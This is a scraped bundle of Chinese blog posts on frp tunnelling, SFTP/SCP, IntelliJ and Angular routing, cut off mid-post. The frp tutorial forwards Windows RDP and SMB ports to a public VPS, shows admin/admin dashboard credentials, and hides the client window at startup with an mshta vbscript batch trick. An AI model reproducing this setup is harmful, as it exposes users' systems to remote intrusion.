VPS一台（也可以是具有公网IP的实体机） \n 访问目标设备（就是你最终要访问的设备） \n 简单的Linux基础（会用cp等几个简单命令即可） \n VPS相关 \n \n 因为frp的原理是利用服务端（所准备的VPS）进行转发，因而VPS的速度直接决定了之后连接的质量，请根据自己的需要选择相应主机配置。 \n 服务端设置 \n SSH连接到VPS之后运行如下命令查看处理器架构，根据架构下载不同版本的frp \n arch\n \n 1 查看结果，如果是“X86_64“即可选择”amd64”，\n运行如下命令，根据架构不同，选择相应版本并进行下载 \n wget  https://github.com/fatedier/frp/releases/download/v0.22.0/frp_0.22.0_linux_amd64.tar.gz\n \n 1 然后解压 \n tar  -zxvf frp_0.22.0_linux_amd64.tar.gz\n \n 1 文件夹改个名，方便使用 \n cp  -r frp_0.22.0_linux_amd64 frp\n \n 1 把解压出来的文件夹复制到你想要的目录下，为了方便我直接放在用户目录下了，进入该目录 \n cd  frp\n \n 1 查看一下文件 \n ls  -a\n \n 1 我们只需要关注如下几个文件 \n frps\nfrps.ini\nfrpc\nfrpc.ini\n前两个文件（s结尾代表server）分别是服务端程序和服务端配置文件，后两个文件（c结尾代表client）分别是客户端程序和客户端配置文件。\n因为我们正在配置服务端，可以删除客户端的两个文件 \n rm  frpc\n rm  frpc.ini\n \n 1 2 然后修改frps.ini文件 \n vim  frps.ini\n \n 1 这个文件应有如下格式 \n [common]\nbind_port = 7000\ndashboard_port = 7500\ntoken = 12345678\ndashboard_user = admin\ndashboard_pwd = admin\nvhost_http_port = 10080\nvhost_https_port = 10443\n \n 1 2 3 4 5 6 7 8 \n 如果没有必要，端口均可使用默认值，token、user和password项请自行设置。 \n \n \n “bind_port”表示用于客户端和服务端连接的端口，这个端口号我们之后在配置客户端的时候要用到。 \n “dashboard_port”是服务端仪表板的端口，若使用7500端口，在配置完成服务启动后可以通过浏览器访问 x.x.x.x:7500 （其中x.x.x.x为VPS的IP）查看frp服务运行信息。 \n “token”是用于客户端和服务端连接的口令，请自行设置并记录，稍后会用到。 \n “dashboard_user”和“dashboard_pwd”表示打开仪表板页面登录的用户名和密码，自行设置即可。 \n “vhost_http_port”和“vhost_https_port”用于反向代理HTTP主机时使用，本文不涉及HTTP协议，因而照抄或者删除这两条均可。\n编辑完成后保存（vim保存如果不会请自行搜索）。\n之后我们就可以运行frps的服务端了 \n \n ./frps -c frps.ini\n \n 1 如果看到屏幕输出这样一段内容，即表示运行正常，如果出现错误提示，请检查上面的步骤。 \n 2019/01/12 15:22:39 [I] [service.go:130] frps tcp listen on 0.0.0.0:7000\n2019/01/12 15:22:39 [I] [service.go:172] http service listen on 0.0.0.0:10080\n2019/01/12 15:22:39 [I] [service.go:193] https service listen on 0.0.0.0:10443\n2019/01/12 15:22:39 [I] [service.go:216] Dashboard listen on 0.0.0.0:7500\n2019/01/12 15:22:39 [I] [root.go:210] Start frps success\n \n 1 2 3 4 5 此时访问 x.x.x.x:7500 并使用自己设置的用户名密码登录，即可看到仪表板界面 \n 服务端后台运行 \n 至此，我们的服务端仅运行在前台，如果Ctrl+C停止或者关闭SSH窗口后，frps均会停止运行，因而我们使用 nohup命令将其运行在后台。 \n nohup后台程序管理或关闭相关命令可自行查询资料，上面这个连接中也有所提及。 \n nohup  ./frps -c frps.ini  & \n \n 1 输出如下内容即表示正常运行 \n nohup: ignoring input and appending output to \'nohup.out\'\n \n 1 此时可先使用Ctrl+C关闭nohup，frps依然会在后台运行，使用jobs命令查看后台运行的程序 \n jobs \n \n 1 在结果中我们可以看到frps正在后台正常运行 \n [1]+  Running                 nohup ./frps -c frps.ini &\n此时访问 x.x.x.x:7500 依然可以打开仪表板界面，至此，服务端即设置完成，你可以关闭SSH窗口了。\n \n 1 2 #  客户端设置 \n \n frp的客户端就是我们想要真正进行访问的那台设备，大多数情况下应该会是一台Windows主机，因而本文使用Windows主机做例子；Linux配置方法类似，不再赘述。 \n \n 同样地，根据客户端设备的情况选择相应的frp程序进行下载，Windows下下载和解压等步骤不再描述。\n假定你下载了“frp_0.22.0_windows_amd64.zip”，将其解压在了C盘根目录下，并且将文件夹重命名为“frp”，可以删除其中的frps和frps.ini文件。\n用文本编辑器打开frpc.ini，与服务端类似，内容如下。 \n [common]\nserver_addr = x.x.x.x\nserver_port = 7000\ntoken = won517574356\n[rdp]\ntype = tcp\nlocal_ip = 127.0.0.1           \nlocal_port = 3389\nremote_port = 7001  \n[smb]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 445\nremote_port = 7002\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 其中common字段下的三项即为服务端的设置。 \n \n “server_addr”为服务端IP地址，填入即可。 \n “server_port”为服务器端口，填入你设置的端口号即可，如果未改变就是7000 \n “token”是你在服务器上设置的连接口令，原样填入即可。 \n 自定义规则 \n frp实际使用时，会按照端口号进行对应的转发.\n上面frpc.ini的rdp、smb字段都是自己定义的规则，自定义端口对应时格式如下。 \n \n “[xxx]”表示一个规则名称，自己定义，便于查询即可。 \n “type”表示转发的协议类型，有TCP和UDP等选项可以选择，如有需要请自行查询frp手册。 \n “local_port”是本地应用的端口号，按照实际应用工作在本机的端口号填写即可。 \n “remote_port”是该条规则在服务端开放的端口号，自己填写并记录即可。 \n \n \n RDP，即Remote Desktop 远程桌面，Windows的RDP默认端口是3389，协议为TCP，建议使用frp远程连接前，在局域网中测试好，能够成功连接后再使用frp穿透连接。 \n SMB，即Windows文件共享所使用的协议，默认端口号445，协议TCP，本条规则可实现远程文件访问。\n配置完成frpc.ini后，就可以运行frpc了\nfrpc程序不能直接双击运行！ \n \n 使用命令提示符或Powershell进入该目录下 \n cd  C: \\ frp\n \n 1 并执行 \n ./frpc -c frpc.ini\n \n 1 运行frpc程序，窗口中输出如下内容表示运行正常。 \n 2019/01/12 16:14:56 [I] [service.go:205] login to server success, get run id [2b65b4e58a5917ac], server udp port [0]\n2019/01/12 16:14:56 [I] [proxy_manager.go:136] [2b65b4e58a5917ac] proxy added: [rdp smb]\n2019/01/12 16:14:56 [I] [control.go:143] [smb] start proxy success\n2019/01/12 16:14:56 [I] [control.go:143] [rdp] start proxy success\n \n 1 2 3 4 不要关闭命令行窗口，此时可以在局域网外使用相应程序访问 x.x.x.x:xxxx （IP为VPS的IP，端口为自定义的remote_port）即可访问到相应服务。 \n 客户端后台运行及开机自启 \n frpc运行时始终有一个命令行窗口运行在前台，影响美观，我们可以使用一个批处理文件来将其运行在后台，而且可以双击执行，每次打开frpc不用再自己输命令了。\n在任何一个目录下新建一个文本文件并将其重命名为“frpc.bat”，编辑，粘贴如下内容并保存。 \n @echo off\nif "%1" == "h" goto begin\nmshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit\n:begin\nREM\ncd C:\\frp\nfrpc -c frpc.ini\nexit\n \n 1 2 3 4 5 6 7 8 \n 将cd后的路径更改为你的frpc实际存放的目录。 \n \n 之后直接运行这个 .bat 文件即可启动frpc并隐藏窗口（可在任务管理器中退出）。\n至于开机启动，把这个 .bat 文件直接扔进Windows的开机启动文件夹就好了 😃\n至此，客户端配置完成，之后就是你自己根据需要在frpc.ini后追加规则即可。\n强烈建议你在使用frp直接测试内网穿透前，先在局域网内测试好相关功能的正常使用，并配置好可能会影响的Windows防火墙等内容，在内网调试通过后再使用frp进行内网穿透测试。 \n'},{title:"Hello Gridea",frontmatter:{title:"Hello Gridea",date:"2018-12-12T00:00:00.000Z",tags:["Gridea"],published:!0,hideInList:!1,feature:"/post-images/hello-gridea.png",isTop:!1},regularPath:"/blogs/2021/hello-gridea.html",relativePath:"blogs/2021/hello-gridea.md",key:"v-39a93e16",path:"/blogs/2021/hello-gridea.html",headers:[{level:2,title:"特性👇",slug:"特性👇"}],excerpt:"<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>\n✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>\n",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 👏  欢迎使用  Gridea  ！ \n✍️   Gridea  一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \n \n Github \n Gridea 主页 \n 示例网站 \n 特性👇 \n 📝  你可以使用最酷的  Markdown  语法，进行快速创作 \n 🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片 \n 🏷️  你可以对文章进行标签分组 \n 📋  你可以自定义菜单，甚至可以创建外部链接菜单 \n 💻  你可以在  Windows ， MacOS  或  Linux  设备上使用此客户端 \n 🌎  你可以使用  𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌  或  Coding Pages  向世界展示，未来将支持更多平台 \n 💬  你可以进行简单的配置，接入  Gitalk  或  DisqusJS  评论系统 \n 🇬🇧  你可以使用 中文简体 或 英语 \n 🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 \n 🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 \n 🌱 当然  Gridea  还很年轻，有很多不足，但请相信，它会不停向前 🏃 \n 未来，它一定会成为你离不开的伙伴 \n 尽情发挥你的才华吧！ \n 😘 Enjoy~ \n"},{title:"intellij idea修改maven配置 总是恢复默认配置 的解决方法",frontmatter:{title:"intellij idea修改maven配置 总是恢复默认配置 的解决方法",date:"2021-08-09T08:34:00.000Z",tags:["maven","idea"],categories:"setting",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/idea_save_maen_setting.html",relativePath:"blogs/2021/idea_save_maen_setting.md",key:"v-31f6f156",path:"/blogs/2021/idea_save_maen_setting.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 用everything搜索project.default.xml\n修改为下面的设置 \n < application > \n   < component   name = " ProjectManager " > \n     < defaultProject > \n       < component   name = " ProjectViewState " > \n         < option   name = " autoscrollFromSource "   value = " true "   /> \n         < option   name = " hideEmptyMiddlePackages "   value = " true "   /> \n         < option   name = " showLibraryContents "   value = " true "   /> \n       </ component > \n       < component   name = " PropertiesComponent " > \n         < property   name = " settings.editor.selected.configurable "   value = " MTHome "   /> \n       </ component > \n     </ defaultProject > \n   </ component > \n </ application > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 '},{title:"文件传输协议FTP、SFTP和SCP",frontmatter:{title:"文件传输协议FTP、SFTP和SCP",date:"2021-12-19 19:29:45",tags:["ftp","sftp","scp"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/2021/system_ftp.html",relativePath:"blogs/2021/system_ftp.md",key:"v-99aa11d6",path:"/blogs/2021/system_ftp.html",headers:[{level:2,title:"网络通信协议分层",slug:"网络通信协议分层"},{level:3,title:"应用层：",slug:"应用层"},{level:3,title:"通信层：",slug:"通信层"},{level:3,title:"网络层：",slug:"网络层"},{level:3,title:"链接层：",slug:"链接层"},{level:2,title:"文件传输协议",slug:"文件传输协议"},{level:3,title:"FTP（File Transfer Protocol）",slug:"ftp-file-transfer-protocol"},{level:3,title:"SFTP（Secure File Transfer Protocol）",slug:"sftp-secure-file-transfer-protocol"},{level:3,title:"SCP（Secure Copy）",slug:"scp-secure-copy"},{level:2,title:"比较：",slug:"比较"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 网络通信协议分层 \n 应用层： \n \n HTTP（Hypertext Transfer Protocol 超文本传输协议，显示网页） \n DNS（Domain Name System） \n FTP（File Transfer Protocol） \n SFTP（SSH File Transfer Protocol，和FTP不一样） \n SCP（Secure copy，based on SSH） \n SSH （Secure Shell） \n 通信层： \n \n TCP（Transmission Control Protocol 三次握手传输协议） \n UDP \n 网络层： \n \n IP（Internet Protocol） \n ICMP（Internet Control Message Protocol，主要用于路由发送错误报告） \n 链接层： \n \n MAC（media access control） \n 文件传输协议 \n FTP（File Transfer Protocol） \n TCP/IP网络上两台计算机传送文件的协议，FTP是在TCP/IP网络和INTERNET上最早使用的协议之一，它属于网络协议组的应用层。FTP客户机可以给服务器发出命令来下载文件，上载文件，创建或改变服务器上的目录。相比于HTTP，FTP协议要复杂得多。复杂的原因，是因为FTP协议要用到两个TCP连接，一个是命令链路，用来在FTP客户端与服务器之间传递命令；另一个是数据链路，用来上传或下载数据。FTP是基于TCP协议的，因此iptables防火墙设置中只需要放开指定端口（21 + PASV端口范围）的TCP协议即可。\nFTP工作模式：\nPORT（主动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路。当需要传送数据时，客户端在命令链路上用PORT命令告诉服务器：“我打开了一个1024+的随机端口，你过来连接我”。于是服务器从20端口向客户端的1024+随机端口发送连接请求，建立一条数据链路来传送数据。\nPASV（Passive被动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路。当需要传送数据时，服务器在命令链路上用PASV命令告诉客户端：“我打开了一个1024+的随机端口，你过来连接我”。于是客户端向服务器的指定端口发送连接请求，建立一条数据链路来传送数据。\nPORT方式，服务器会主动连接客户端的指定端口，那么如果客户端通过代理服务器链接到internet上的网络的话，服务器端可能会连接不到客户端本机指定的端口，或者被客户端、代理服务器防火墙阻塞了连接，导致连接失败。PASV方式，服务器端防火墙除了要放开21端口外，还要放开PASV配置指定的端口范围。 \n SFTP（Secure File Transfer Protocol） \n 安全文件传送协议。可以为传输文件提供一种安全的加密方法。SFTP与 FTP有着几乎一样的语法和功能。SFTP为SSH的一部份，是一种传输文件到服务器的安全方式。在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件传输子系统，SFTP本身没有单独的守护进程，它必须使用sshd守护进程（端口号默认是22）来完成相应的连接操作，所以从某种意义上来说，SFTP并不像一个服务器程序，而更像是一个客户端程序。SFTP同样是使用加密传输认证信息和传输的数据，所以，使用SFTP是非常安全的。但是，由于这种传输方式使用了加密/解密技术，所以传输效率比普通的FTP要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP \n \n 连接到远程服务器 \n \n #scp 命令使用端口号 22 默认 22 可省略 \n sftp  -P  22  ubuntu@192.168.2.72\n \n 1 2 \n 当前服务器路径 \n \n pwd \n \n 1 \n 当前本地路径 \n \n lpwd\n \n 1 \n 下载文件到本地 \n \n get filename\n \n 1 \n 下载文件到本地 \n \n put filename\n \n 1 具体参考 登录到远程系统以复制文件 (sftp) \n SCP（Secure Copy） \n SCP就是Secure copy，是用来进行远程文件复制的，并且整个复制过程是加密的。数据传输使用ssh，并且和使用和ssh相同的认证方式，提供相同的安全保证。 \n \n 文件从本地复制到远程 \n \n #scp 命令使用端口号 4588 默认 22 可省略 \n scp  -P  4588  local_file remote_username@remote_ip:remote_folder\n \n 1 2 \n 文件夹从本地复制到远程 \n \n #scp 命令使用端口号 4588 默认 22 可省略 \n scp  -P  4588  -r local_folder remote_username@remote_ip:remote_folder\n \n 1 2 \n 文件从远程复制到本地 \n \n #scp 命令使用端口号 4588 默认 22 可省略 \n scp  -P  4588  remote_username@remote_ip:remote_folder local_file\n \n 1 2 \n 文件夹从远程复制到本地 \n \n #scp 命令使用端口号 4588 默认 22 可省略 \n scp  -P  4588  -r remote_username@remote_ip:remote_folder local_folder\n \n 1 2 具体参考 如何在两个系统之间复制文件 (scp) \n 比较： \n \n FTP 基于TCP来传输文件，明文传输用户信息和数据。 \n SFTP 基于SSH来加密传输文件，可靠性高，可断点续传。 \n SCP 是基于SSH来加密拷贝文件，但要知道详细目录，不可断点续传。 \n \n"},{title:"JS中判断对象是否包含某个key的方法",frontmatter:{title:"JS中判断对象是否包含某个key的方法",date:"2021-07-18T23:58:17.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/_11_temp.html",relativePath:"blogs/_11_temp.md",key:"v-958c3346",path:"/blogs/_11_temp.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:""},{title:"Angular组件传值方法",frontmatter:{title:"Angular组件传值方法",date:"2021-04-29T18:57:06.000Z",tags:["angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular-zu-jian-chuan-zhi-fang-fa.html",relativePath:"blogs/angular/angular-zu-jian-chuan-zhi-fang-fa.md",key:"v-d2366516",path:"/blogs/angular/angular-zu-jian-chuan-zhi-fang-fa.html",headers:[{level:2,title:"1.父子组件之间的传值方法",slug:"_1-父子组件之间的传值方法"},{level:3,title:"1.1 @InInput和@Output方法",slug:"_1-1-ininput和-output方法"},{level:3,title:"1.2 inputs和outputs",slug:"_1-2-inputs和outputs"},{level:3,title:"1.3 @ViewChild,父组件获取子组件的引用",slug:"_1-3-viewchild-父组件获取子组件的引用"},{level:3,title:"1.4 局部变量，父组件获取子组件引用",slug:"_1-4-局部变量-父组件获取子组件引用"},{level:2,title:"2.非父子组件之间传值",slug:"_2-非父子组件之间传值"},{level:3,title:"2.1 service",slug:"_2-1-service"},{level:3,title:"2.2 使用BehaviorSubject",slug:"_2-2-使用behaviorsubject"},{level:3,title:"2.3 路由传值",slug:"_2-3-路由传值"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 一.组件之间传值的方法 \n 1.父子组件之间的传值方法 \n 1.1 @InInput和@Output方法 \n ·子组件 component . ts\n export   class   testExample   implements   OnInit { \n\t@Input test : any  =   { } ; \n\t@Output testFun  =   new   EventEmitter < any > ( ) ; \n } \n\n\n父组件模版引用子组件\n < test - example  [ test ] = \"test\"   ( testFun ) = \"testFun($event)\" > < / test - example > \n \n 1 2 3 4 5 6 7 8 9 @Input修饰的变量为父组件传入子组件的输入属性. @Outpue修饰的子组件传入父组件的输出属性. \n 1.2 inputs和outputs \n 子组件 component . ts\n@ Component ( { \n      //... \n    inputs : [ 'test' ] , \n    outputs : [ 'testFun' ] \n } ) \n \n 父组件模版引用子组件\n export   class   testExample   implements   OnInit { \n    test : any  =   { } ; \n    testFun  =   new  \t EventEmitter < any > ( ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  1.3 @ViewChild,父组件获取子组件的引用 \n import   {  Component , AfterViewInit , ViewChild  }   from   '@angular/core' ; \n@ Component ( { \n    selector : 'collection' , \n    template : ` \n        <contact-collect (click)=\"collectTheContact()\"></contact-collect>\n     ` \n } ) \n export   class   CollectionComponent   { \n    @ ViewChild ( ContactCollectComponent )  contactCollect :  ContactCollectComponent ; \n     ngAfterViewInit ( ) { \n         //... \n     } \n     \n     collectTheContact ( ) { \n         this . contactCollect . collectTheContact ( ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ViewChild是属性装饰器,用来从模板视图中获取匹配的元素.视图查询在ngAfterViewInit钩子函数调用前完成,因此在ngAfterViewInit钩子函数中,就能正常获取查询的元素.\nViewChildren装饰器用来从模板中获取匹配的多个元素,返回的结果是一个QueryList集合, 使用模板变量名设置查询条件 \n 1.4 局部变量，父组件获取子组件引用 \n template : `\n         < contact - collect   ( click ) = \"collectTheContact()\"  #collect > < / contact - collect > \n \n 1 2 绑定局部变量collect(以#号标记),以此来获取子组件类的实例对象. \n 2.非父子组件之间传值 \n 2.1 service \n 需要双向的触发(发送信息/接收信息) \n service . ts\n import   {  Component ,  Injectable ,  EventEmitter  }   from   \"@angular/core\" ; \n@ Injectable ( ) \n export   class   myService   { \n   public  info :  string  =   \"\" ; \n   constructor ( )   { } \n } \n \n 1 2 3 4 5 6 7 组件1向service传递信息 \n import   {  myService  }   from   '../../service/myService.service' ; \n ... \n constructor ( \n   public  service :  myService \n )   {   } \n\n changeInfo ( )   { \n   this . service . info  =   this . service . info  +   \"1234\" ; \n } \n ... \n \n 1 2 3 4 5 6 7 8 9 10 组件2从service获取信息 \n import   {  myService  }   from   '../../service/myService.service' ; \n ... \n constructor ( \n   public  service :  myService \n )   {   } \n\n showInfo ( )   { \n   alert ( this . service . info ) ; \n } \n ... \n \n 1 2 3 4 5 6 7 8 9 10 #  2.2 使用BehaviorSubject \n 发布者订阅者模式,当数据改变时,订阅者也能得到响应\nservice \n import   {  Injectable  }   from   '@angular/core' ; \n import   {  Subject  }   from   'rxjs' ; \n@ Injectable ( ) \n export   class   PcServiceService   { \n     constructor ( )   {   } \n     // 创建Subject实例 \n    emitChangeSource  =   new   Subject < any > ( ) ; \n     // 创建Observable \n    changeEmitted$  =   this . emitChangeSource . asObservable ( ) ; \n     // 调用该方法发布消息 \n     emitChange ( change :  any ) :   void   { \n         this . emitChangeSource . next ( change ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 组件调用service的方法传信息和接收信息 \n constructor ( public  service :  PcServiceService )   { \n } \n changeValue ( ) :   void   { \n   // 调用服务发布消息 \n   this . service . emitChange ( this . user ) ; \n } \n\nform ! :  any ; \n constructor ( public  service :  PcServiceService )   { \n     // 订阅消息 \n    service . emitChangeSource . subscribe ( text   =>   { \n       this . form  =  text ; \n     } ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #  2.3 路由传值 \n 2.3.1 在查询参数中传递 \n //传递数据 \n ... \n < a  [ routerLink ] = \"['/stock']\"   [ queryParams ] = \"{id: 1}\" > 股票详情 < / a > \n // http://localhost:4200/stock?id=1 \n\n //接受参数 \n ... \n import   {  ActivatedRoute  }   from   '@amgular/router' ; \n export   class   StockComponent   implements   OnInit   { \n     private  stockId :  number ;     \n     constructor ( private  routeInfo :  ActivatedRoute ) \n     ngOnInit ( )   { \n         this . stockId  =   this . routeInfo . snapshot . queryParams [ 'id' ] ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #  2.3.2 在路由路径中传递 \n //修改配置 \n const  routes :  Routes  =   [ \n   { path :   '' ,  redirectTo :   '/index' ,  pathMatch :   'full' } , \n   { path :   'index' ,  component :  IndexComponent } , \n   { path :   'stock/:id' ,  component :  StocksComponent  } , \n   { path :   '**' ,  component :  ErrorPageComponent  } \n ] ; \n\n //传递数据 \n ... [ \n ] ( url ) < a  [ routerLink ] = \"['/stock', 1]\" > 股票详情 < / a > \n // http://localhost:4200/stock/1 \n\n //接受参数 \n ... \n import   {  ActivatedRoute  }   from   '@amgular/router' ; \n export   class   StockComponent   implements   OnInit   { \n     private  stockId :  number ;     \n     constructor ( private  routeInfo :  ActivatedRoute ) \n     ngOnInit ( )   { \n         this . stockId  =   this . routeInfo . snapshot . params [ 'id' ] ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #  2.3.3 在路由配置中传递 \n //路由配置配置 \n const  routes :  Routes  =   [ \n   { path :   '' ,  redirectTo :   '/index' ,  pathMatch :   'full' } , \n   { path :   'index' ,  component :  IndexComponent ,  data :   { title :   'Index Page' } } , \n   { path :   'stock/:id' ,  component :  StocksComponent ,  data :   { title :   'Stock Page' } } , \n   { path :   '**' ,  component :  ErrorPageComponent ,  data :   { title :   'Stock Page' } } \n ] ; \n //接受参数 \n this . title  =   this . routeInfo . snapshot . date [ 0 ] [ 'title' ] ; \n \n 1 2 3 4 5 6 7 8 9 #  二.其它传值方式 \n cookie、session、storage \n"},{title:"Angular 模态框",frontmatter:{title:"Angular 模态框",date:"2021-05-23T17:51:12.000Z",tags:["Angular","UI"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_GKbqe4RBZ.html",relativePath:"blogs/angular/angular_GKbqe4RBZ.md",key:"v-843d7756",path:"/blogs/angular/angular_GKbqe4RBZ.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在项目开发的过程中肯定需要弹出视图，这种视图称之为模态框。 \n \n DevUI \n 源码 \n \n 手动重写 \n 源码 \n \n \n NG-Bootstrap \n \n \n NGX-Bootstrap \n 源码 \n \n \n ng-zorro \n \n \n"},{title:"解决关于 npm build --prod ，出现 ERROR in budgets, maximum exceeded for initial.",frontmatter:{title:"解决关于 npm build --prod ，出现 ERROR in budgets, maximum exceeded for initial. ",date:"2021-08-01T23:13:10.000Z",tags:["Angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_H06-CD5rt.html",relativePath:"blogs/angular/angular_H06-CD5rt.md",key:"v-ee437296",path:"/blogs/angular/angular_H06-CD5rt.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 执行命令 ：npm build --pord，出现以下错误 \n WARNING in Invalid background value at 11:14. Ignoring.\nWARNING in budgets, maximum exceeded for initial. Budget 2 MB was exceeded by 3.73 MB.\nERROR in budgets, maximum exceeded for initial. Budget 5 MB was exceeded by 750 kB.\n \n 1 2 3 解决方案：\n打开angular.json文件，找到budgets看到这段 \n "budgets": [\n   {\n      "type": "initial",\n      "maximumWarning": "2mb",\n      "maximumError": "5mb"\n   }\n]\n \n 1 2 3 4 5 6 7 修改相关配置即可 \n'},{title:"Angular项目部署到 ngnix服务器 刷新 404",frontmatter:{title:"Angular项目部署到 ngnix服务器 刷新 404",date:"2021-07-27T22:33:49.000Z",tags:["Angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_MWEc6KOiS.html",relativePath:"blogs/angular/angular_MWEc6KOiS.md",key:"v-6f1710d5",path:"/blogs/angular/angular_MWEc6KOiS.html",headers:[{level:2,title:"方法1：",slug:"方法1"},{level:2,title:"方法2：",slug:"方法2"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 一、angular默认路由 h5路由 \n 将angular项目的  index.html 的标签修改为  <base href=\"/myangular/\">  重新编译部署\n修改ngnix服务器的配置文件nginx.conf \n location /myangular  { \n            alias  /html/myangular;#angular项目所在目录\n            index  index.html index.htm;\n            try_files $uri $uri/ /index.html = 404 ;\n         } \n \n 1 2 3 4 5 #  二、angular  hash路由 #（不需要修改服务器） \n 直接在angular项目的app.module.ts文件中添加相关配置 \n 方法1： \n imports :   [ \n   RouterModule . forRoot ( routers ,   { useHash :   true } ) \n ] , \n \n 1 2 3 #  方法2： \n //导入hash模块 \n import   {  LocationStrategy ,  HashLocationStrategy  }   from   '@angular/common' ; \n@ NgModule ( { \n //进行配置 \nproviders :   [ { provide :  LocationStrategy ,  useClass :  HashLocationStrategy } ] ， \n } \n \n 1 2 3 4 5 6 "},{title:"Angular 项目去除url中的#",frontmatter:{title:"Angular 项目去除url中的#",date:"2021-07-27T22:51:02.000Z",tags:["angular"],categories:"front-end-angular",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/angular/angular_QEHF44uS3.html",relativePath:"blogs/angular/angular_QEHF44uS3.md",key:"v-3d1e0635",path:"/blogs/angular/angular_QEHF44uS3.html",headers:[{level:2,title:"2.1  前端",slug:"_2-1-前端"},{level:2,title:"2.2 ngx配置",slug:"_2-2-ngx配置"},{level:2,title:"2.3 Apache",slug:"_2-3-apache"},{level:2,title:"2.4 Tomcat配置",slug:"_2-4-tomcat配置"},{level:2,title:"2.5 GithubPages / 码云 Pages + 404 页面",slug:"_2-5-githubpages-码云-pages-404-页面"},{level:2,title:"3.1  这个得先说下什么是前端路由：",slug:"_3-1-这个得先说下什么是前端路由"},{level:2,title:"3.2 Angular中的路由策略",slug:"_3-2-angular中的路由策略"},{level:2,title:"3.3 前端路由优缺点",slug:"_3-3-前端路由优缺点"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 1. 为什么要去除？ \n \n Angular官方指出：如果没有足够使用hash风格（#）的理由，还是尽量使用HTML5模式的路由风格； \n 如果配置了hash风格，在微信支付或是Angular的深路径依然会出404的问题； \n 当你需要使用GA等工具时，由于无法获取#号后的URL，导致每次路由切换都给其发送一个路径； \n \'#\'有点丑。 \n 2. 怎样才能去除？ \n 有四个方法： \n \n 前端 + ngx \n 前端 + Apache \n 前端 + Tomcat \n GithubPages / 码云 Pages + 404 页面 \n 2.1  前端 \n index.html的head里加 \n < base href = "/" > \n \n 1 app.module.ts \n import   {   ROUTER_CONFIG   }   from   \'./app.routes.ts\' ; \n@ NgModule ( { \n   imports :   [ \n     ... \n    RouterModule . forRoot ( ROUTER_CONFIG )  \n    //  RouterModule.forRoot(ROUTER_CONFIG, { useHash: true } )   这样写是带#的 \n   ] ,   \n } ) \n \n 1 2 3 4 5 6 7 8 app.routes.ts： \n import   {  NgModule  }   from   \'@angular/core\' ; \n import   {  Routes  }   from   \'@angular/router\' ; \n\n export   const   ROUTER_CONFIG :  Routes  =   [ \n   { \n    ... \n   } \n ] ; \n \n 1 2 3 4 5 6 7 8 如果只配置前端会怎么样？\n如果只配置前端虽然会去掉\'#\'但是一刷新页面就404，路径解析上出错了。\nAngular是单页应用，它实现了前端路由功能，后台可以不再控制路由的跳转，将原本属于后端的业务逻辑全部丢给前端。\n用户刷新页面时(http://gitee.poetry/life), 请求是先被提交到了WebServer后台，后台路由没有对应页面的路由管理，就会出现404的错误。\n用户如果是先访问首页(http://gitee.poetry), 然后再跳转到 页面(http://gitee.poetry/life), 则这个跳转是由Angular前台管理的URL，访问是正常的。\n那么我们让WebServer把属于Angular管理的路由URL，都转发到index.html就可以解决404的问题了，也就是后面介绍的配置信息。\n思考：hash模式为什么不会404？ \n 2.2 ngx配置 \n 带 *** 的是需要自己配置 nginx.conf 文件内容 \n server  { \n    listen 80;   #监听的端口号  \n    server_name  my_server_name;  # 服务器名称  *** \n    root   /projects/angular/myproject/dist;   #相对于nginx的位置 *** \n    index index.html;  #如果index.html存在，就结束查找过程，把这个文件附加到请求的request_uri后面，并且发起一个内部的redirect。 \n    location /  {    # / 是匹配所有的uri后执行下面操作 \n        try_files $uri $uri/ /index.html;  #try_files先寻找名为 $uri 文件，没有则寻找 $uri/ 文件，再没有就寻找/index.html \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 \n try_files 